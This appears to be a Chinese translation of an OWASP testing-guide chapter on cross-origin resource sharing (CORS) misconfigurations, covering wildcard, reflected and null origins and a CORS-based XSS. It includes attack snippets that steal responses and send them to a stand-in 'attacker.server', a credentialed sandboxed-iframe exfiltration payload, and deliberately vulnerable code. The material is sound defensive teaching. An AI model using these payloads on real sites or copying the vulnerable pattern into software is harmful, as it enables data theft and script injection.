# 测试跨源资源共享

|ID          |
|------------|
|WSTG-CLNT-07|

## 概述

[跨源资源共享](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing)（CORS）是一种机制，它使 Web 浏览器能够以受控方式使用 XMLHttpRequest（XHR）Level 2（L2）API 执行跨域请求。在过去，XHR L1 API 仅允许在同源内发送请求，因为它受到[同源策略](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)（SOP）的限制。

跨域请求带有一个 `Origin` 头，用于标识发起请求的域，该头始终发送到服务器。CORS 定义了 Web 浏览器和服务器之间使用的协议，以确定是否允许跨域请求。使用 HTTP [头部](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing#Headers)来实现此目的。

[W3C CORS 规范](https://www.w3.org/TR/cors/)规定，对于非简单请求（例如 GET 或 POST 以外的请求，或使用凭据的请求），必须提前发送一个预检 OPTIONS 请求，以检查该类型的请求是否会对数据产生不良影响。预检请求检查服务器允许的方法和头部，以及是否允许凭据。根据 OPTIONS 请求的结果，浏览器决定是否允许该请求。

### Origin 与 Access-Control-Allow-Origin

`Origin` 请求头始终由浏览器在 CORS 请求中发送，并指示请求的来源。`Origin` 头不能通过 JavaScript 更改，因为[浏览器（用户代理）阻止其修改](https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name)；然而，依赖此头部进行访问控制检查并非良策，因为它可能在浏览器外部被伪造（例如通过代理），因此您仍需检查是否使用了应用层协议来保护敏感数据。

`Access-Control-Allow-Origin` 是一个响应头，由服务器用来指示允许哪些域读取响应。根据 CORS W3C 规范，是否允许客户端访问响应数据取决于客户端基于此头部来决定和执行限制。

从安全测试的角度来看，您应关注不安全的配置，例如使用 `*` 通配符作为 `Access-Control-Allow-Origin` 头的值，这意味着允许所有域。另一个不安全的示例是服务器直接返回 origin 头而不进行任何额外检查，这可能导致敏感数据被访问。请注意，允许跨域请求的配置通常非常不安全，在一般情况下是不可接受的，除非是旨在供所有人访问的公共 API。

### Access-Control-Request-Method 与 Access-Control-Allow-Method

当浏览器执行预检 OPTIONS 请求时，会使用 `Access-Control-Request-Method` 头，让客户端指示最终请求的请求方法。另一方面，`Access-Control-Allow-Method` 是服务器使用的响应头，用于描述允许客户端使用的方法。

### Access-Control-Request-Headers 与 Access-Control-Allow-Headers

这两个头部用于浏览器和服务器之间，以确定可以使用哪些头部来执行跨域请求。

### Access-Control-Allow-Credentials

此响应头允许浏览器在传递凭据时读取响应。当发送此头部时，Web 应用程序必须将 `Access-Control-Allow-Origin` 头的值设置为一个来源。`Access-Control-Allow-Credentials` 头不能与值为 `*` 通配符的 `Access-Control-Allow-Origin` 头一起使用，如下所示：

```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

### 输入验证

XHR L2 引入了使用 XHR API 创建跨域请求的可能性，以实现向后兼容。这可能引入 XHR L1 中不存在的安全漏洞。代码中需要关注的潜在利用点包括未经验证就传递给 XMLHttpRequest 的 URL，特别是当允许绝对 URL 时，因为这可能导致代码注入。同样，如果响应数据未转义且我们可以通过用户提供的输入来控制它，则应用程序的其他部分也可能被利用。

### 其他头部

还有其他涉及的头部，如 `Access-Control-Max-Age`，它确定预检请求在浏览器中可被缓存的时间，或 `Access-Control-Expose-Headers`，它指示哪些头部可以安全地暴露给 CORS API 规范的 API。

要审查 CORS 头部，请参考 [CORS MDN 文档](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#The_HTTP_response_headers)。

## 测试目标

- 识别实现 CORS 的端点。
- 确保 CORS 配置安全或无危害。

## 如何测试

像 [ZAP](https://www.zaproxy.org) 这样的工具可以使测试人员拦截 HTTP 头部，从而揭示 CORS 的使用方式。测试人员应特别关注 origin 头部，以了解允许哪些域。此外，在某些情况下，需要手动检查 JavaScript 以确定代码是否因用户提供的输入处理不当而易受代码注入攻击。

### CORS 错误配置

将通配符设置为 `Access-Control-Allow-Origin` 头（即 `Access-Control-Allow-Origin: *`）在响应包含敏感信息时是不安全的。尽管它不能与 `Access-Control-Allow-Credentials: true` 同时使用，但在访问控制仅由防火墙规则或源 IP 地址完成，而非由凭据保护的情况下，这可能是危险的。

#### 通配符 Access-Control-Allow-Origin

测试人员可以检查 HTTP 响应消息中是否存在 `Access-Control-Allow-Origin: *`。

```http
HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: *
Content-Length: 4
Content-Type: application/xml

[响应正文]
```

如果响应包含敏感数据，攻击者可以通过使用 XHR 窃取它：

```html
<html>
    <head></head>
    <body>
        <script>
            var xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                    var xhr2 = new XMLHttpRequest();
                    // attacker.server: 用于窃取响应的攻击者监听器
                    xhr2.open("POST", "https://attacker.server", true);
                    xhr2.send(xhr.responseText);
                }
            };
            // victim.site: 存在 `Access-Control-Allow-Origin: *` 头的易受攻击服务器
            xhr.open("GET", "https://victim.site", true);
            xhr.send();
        </script>
    </body>
</html>
```

#### 动态 CORS 策略

现代 Web 应用程序或 API 可能被实现为动态允许跨域请求，通常是为了允许来自子域的请求，如下所示：

```php
if (preg_match('|\.example.com$|', $_SERVER['SERVER_NAME'])) {
   header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");
   ...
}
```

在此示例中，将允许来自 example.com 子域的所有请求。必须确保用于匹配的正则表达式是完整的。否则，如果只是简单地匹配 `example.com`（未附加 `$`），攻击者可能通过将其域附加到 `Origin` 头部来绕过 CORS 策略。

```http
GET /test.php HTTP/1.1
Host: example.com
[...]
Origin: https://example.com.attacker.com
Cookie: <session cookie>
```

当发送上述请求时，如果返回以下响应，并且 `Access-Control-Allow-Origin` 的值与攻击者的输入相同，则攻击者之后可以读取响应并访问仅有受害者用户可访问的敏感信息。

```http
HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: https://example.com.attacker.com
Access-Control-Allow-Credentials: true
Content-Length: 4
Content-Type: application/xml

[响应正文]
```

#### 白名单中的 Null Origin 值

`Origin` 头在某些特定情况下可能具有值 `null`，例如从本地文件、重定向或序列化对象触发的请求。开发人员有时会将 `null` 来源列入白名单，以方便本地开发或支持非 Web 客户端。

然而，`null` 来源充当一个“通配符”，可能被利用。攻击者可以通过使用沙盒化的 `iframe` 以编程方式生成一个 origin 为 `null` 的请求。

如果服务器只是在响应头中反射 `null` 来源，特别是在允许凭据的情况下，就会产生类似于通用通配符的漏洞。

```http
HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
Content-Length: 4
Content-Type: application/xml
```

在攻击场景中，攻击者在其恶意站点上嵌入一个沙盒化的 `iframe`。`sandbox` 属性强制浏览器将从该框架内发起的请求的 `Origin` 设置为 `null`。

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
    <script>
        fetch('https://victim.site/sensitive-data', {
            method: 'GET',
            credentials: 'include' // 发送 Cookie/认证头所必需的
        })
        .then(response => response.text())
        .then(data => {
            // 将数据外泄到攻击者的服务器
            location.href = 'https://attacker.server/log?data=' + btoa(data);
        });
    </script>">
</iframe>
```

因此，浏览器认为请求来自 `null`，服务器允许 `null`，攻击者成功读取了敏感响应。

### 输入验证弱点

CORS 概念可以从一个完全不同的角度来审视。攻击者可能故意允许其 CORS 策略，以向目标 Web 应用程序注入代码。

#### 利用 CORS 的远程 XSS

此代码对 URL 中 `#` 字符后传递的资源发出请求，最初用于获取同一服务器上的资源。

易受攻击的代码：

```html
<script>
    var req = new XMLHttpRequest();

    req.onreadystatechange = function() {
        if(req.readyState==4 && req.status==200) {
            document.getElementById("div1").innerHTML=req.responseText;
        }
    }

    var resource = location.hash.substring(1);
    req.open("GET",resource,true);
    req.send();
</script>

<body>
    <div id="div1"></div>
</body>
```

例如，像这样的请求将显示 `profile.php` 文件的内容：

`https://example.foo/main.php#profile.php`

由 `https://example.foo/profile.php` 生成的请求和响应：

```html
GET /profile.php HTTP/1.1
Host: example.foo
[...]
Referer: https://example.foo/main.php
Connection: keep-alive

HTTP/1.1 200 OK
[...]
Content-Length: 25
Content-Type: text/html

[响应正文]
```

现在，由于没有 URL 验证，我们可以注入一个远程脚本，该脚本将在 `example.foo` 域的上下文中注入并执行，使用如下 URL：

```text
https://example.foo/main.php#https://attacker.bar/file.php
```

由 `https://attacker.bar/file.php` 生成的请求和响应：

```html
GET /file.php HTTP/1.1
Host: attacker.bar
[...]
Referer: https://example.foo/main.php
origin: https://example.foo

HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: *
Content-Length: 92
Content-Type: text/html

来自 attacker.bar 的注入内容 <img src="#" onerror="alert('Domain: '+document.domain)">
```
